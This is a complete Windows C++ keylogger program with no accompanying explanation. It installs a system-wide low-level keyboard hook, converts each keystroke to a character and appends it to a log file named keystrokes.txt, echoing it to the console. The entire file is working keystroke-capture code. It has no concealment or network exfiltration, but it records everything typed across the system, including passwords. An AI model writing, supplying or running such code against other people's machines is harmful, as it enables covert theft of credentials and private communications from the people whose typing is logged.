#include <iostream>
#include <fstream>
#include <windows.h>

HHOOK hHook = NULL;
std::ofstream logFile("keystrokes.txt", std::ios::app);

char GetCharFromVKCode(int vkCode, bool shiftPressed) {
    BYTE keyboardState[256] = { 0 };
    if (shiftPressed) {
        keyboardState[VK_SHIFT] = 0x80;
    }

    WCHAR buffer[2] = { 0 };
    ToUnicode(vkCode, 0, keyboardState, buffer, 2, 0);
    return static_cast<char>(buffer[0]);
}

bool IsSpecialKey(int vkCode) {
    return (vkCode == VK_MENU || vkCode == VK_TAB || vkCode == VK_SHIFT || vkCode == VK_CONTROL);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    static char previousChar = '\0';

    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        int vkCode = ((LPKBDLLHOOKSTRUCT)lParam)->vkCode;
        bool shiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;

        // Check if the key is a special key (Alt, Tab, Shift, Ctrl)
        if (!IsSpecialKey(vkCode)) {
            char c = GetCharFromVKCode(vkCode, shiftPressed);

            if (c == ' ' && previousChar == ' ') {
                // Skip consecutive spaces, add only one newline
                previousChar = c;
            } else {
                // Output the character to the console and log file
                std::cout << c << std::endl;
                logFile << c << std::endl << std::flush;
                previousChar = c;
            }
        }
    }

    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main() {
    HINSTANCE hInstance = GetModuleHandle(NULL);

    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);

    if (hHook == NULL) {
        std::cerr << "Failed to install hook: " << GetLastError() << std::endl;
        return 1;
    }

    // Enter an application message loop to keep the hook running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Uninstall the hook
    UnhookWindowsHookEx(hHook);
    logFile.close();

    return 0;
}
